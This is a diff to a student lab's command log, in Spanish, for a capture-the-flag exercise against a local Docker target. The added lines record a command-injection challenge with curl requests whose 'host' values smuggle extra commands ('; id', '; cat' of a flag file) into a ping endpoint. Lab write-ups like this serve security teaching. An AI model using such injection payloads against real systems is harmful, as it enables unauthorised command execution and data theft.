@@ -1,6 +1,6 @@
 # ==============================================================================
 # Bitácora de Comandos — Laboratorio 07 (Grupo 10)
-# Retos resueltos: R1 (SQLi Auth Bypass) y R2 (SQLi UNION)
+# Retos con evidencia: R1, R2, R3 y R5. R4 sigue pendiente.
 # Target: http://phantomcorp
 # Entorno: Docker (cyberlab-attacker -> cyberlab-phantomcorp)
 # ==============================================================================
@@ -86,4 +86,15 @@ curl -sS -i -G http://phantomcorp/perfil --data-urlencode "id=1"
 
 # 4. Confirmar progreso actualizado.
 ./ctf status 07
+
+# --- RETO 3: Command injection (GET /herramientas/ping?host=) ---
+# Ejecutar desde PowerShell en la raíz del repositorio; attacker envía las
+# solicitudes al target local phantomcorp.
+docker compose -p cyberlab --project-directory . -f entorno/docker-compose.yml -f labs/lab07-explotacion/entorno/target.compose.yml exec -T attacker curl -sS -i -G http://phantomcorp/herramientas/ping --data-urlencode 'host=127.0.0.1'
+docker compose -p cyberlab --project-directory . -f entorno/docker-compose.yml -f labs/lab07-explotacion/entorno/target.compose.yml exec -T attacker curl -sS -i -G http://phantomcorp/herramientas/ping --data-urlencode 'host=127.0.0.1; id'
+docker compose -p cyberlab --project-directory . -f entorno/docker-compose.yml -f labs/lab07-explotacion/entorno/target.compose.yml exec -T attacker curl -sS -i -G http://phantomcorp/herramientas/ping --data-urlencode 'host=127.0.0.1; cat /app/flags/cmdi.txt'
+
+# La flag fue aceptada por `bash ./ctf submit 07 R3` en una copia temporal
+# con CRLF normalizados. No se modificó .progreso del repositorio compartido.
+# Salidas observadas: evidencia/salidas/r3_01_baseline.txt a r3_04_verificador.txt.
 
